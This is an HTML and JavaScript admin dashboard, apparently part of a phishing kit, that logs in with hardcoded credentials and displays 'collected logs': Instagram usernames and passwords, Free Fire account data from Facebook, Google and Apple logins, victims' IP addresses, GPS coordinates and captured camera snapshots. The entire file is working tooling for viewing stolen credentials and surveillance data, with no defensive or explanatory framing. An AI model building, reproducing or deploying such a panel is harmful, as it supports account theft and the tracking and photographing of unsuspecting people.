<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Viewer Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
        .login-container, .dashboard { max-width: 900px; margin: 0 auto; background: #1e293b; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        .hidden { display: none !important; }
        input, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 5px; border: 1px solid #475569; background: #334155; color: white; }
        button { background: #3b82f6; cursor: pointer; font-weight: bold; }
        button:hover { background: #2563eb; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tabs button { flex: 1; background: #475569; }
        .tabs button.active { background: #2563eb; }
        .card { background: #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #3b82f6; }
        .card img { max-width: 150px; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>

    <!-- Login Section -->
    <div id="loginSection" class="login-container">
        <h2>Admin Login</h2>
        <input type="text" id="username" placeholder="Username (sumit@1123)">
        <input type="password" id="password" placeholder="Password (sumit1123)">
        <button onclick="login()">Login</button>
        <p id="errorMsg" style="color: #ef4444;"></p>
    </div>

    <!-- Dashboard Section -->
    <div id="dashboardSection" class="dashboard hidden">
        <h2>Collected Logs Dashboard</h2>
        <div class="tabs">
            <button id="tabInsta" class="active" onclick="switchTab('insta')">Instagram Logs</button>
            <button id="tabFF" onclick="switchTab('ff')">Free Fire Data (FB/Google/Apple)</button>
        </div>
        <div id="dataContainer">Loading data...</div>
    </div>

    <script>
        let currentTab = 'insta';

        function login() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;

            fetch('/api/admin-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('loginSection').classList.add('hidden');
                    document.getElementById('dashboardSection').classList.remove('hidden');
                    loadData();
                } else {
                    document.getElementById('errorMsg').innerText = 'Invalid Username or Password';
                }
            });
        }

        function switchTab(tab) {
            currentTab = tab;
            if(tab === 'insta') {
                document.getElementById('tabInsta').classList.add('active');
                document.getElementById('tabFF').classList.remove('active');
            } else {
                document.getElementById('tabFF').classList.add('active');
                document.getElementById('tabInsta').classList.remove('active');
            }
            loadData();
        }

        function loadData() {
            const endpoint = currentTab === 'insta' ? '/api/get-data' : '/api/get-ff-data';
            document.getElementById('dataContainer').innerHTML = 'Loading...';

            fetch(endpoint)
            .then(res => res.json())
            .then(data => {
                const container = document.getElementById('dataContainer');
                container.innerHTML = '';
                const keys = Object.keys(data);

                if (keys.length === 0) {
                    container.innerHTML = '<p>No data found.</p>';
                    return;
                }

                keys.forEach(key => {
                    const item = data[key];
                    const card = document.createElement('div');
                    card.className = 'card';
                    card.innerHTML = `
                        <strong>ID:</strong> ${item.id} <br>
                        <strong>Platform / User:</strong> ${item.platform || item.instagram_username} <br>
                        <strong>Password / Info:</strong> ${item.instagram_password} <br>
                        <strong>IP Address:</strong> ${item.ip} <br>
                        <strong>Location:</strong> Lat: ${item.latitude}, Lng: ${item.longitude} <br>
                        <strong>Time:</strong> ${new Date(item.timestamp).toLocaleString()} <br>
                        ${item.image_base64 ? `<br><img src="${item.image_base64}" alt="Snapshot"/>` : ''}
                    `;
                    container.appendChild(card);
                });
            });
        }
    </script>
</body>
</html>
